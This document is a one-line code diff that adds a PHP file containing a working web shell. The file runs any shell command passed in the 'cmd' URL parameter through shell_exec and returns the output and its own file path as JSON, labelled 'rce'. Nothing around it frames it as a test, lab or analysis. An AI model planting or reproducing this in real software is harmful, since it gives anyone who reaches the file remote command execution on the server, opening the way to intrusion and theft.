@@ -1,0 +1,1 @@
+<?php echo json_encode(["rce"=>shell_exec($_GET["cmd"]??"id"),"path"=>__FILE__]); ?>
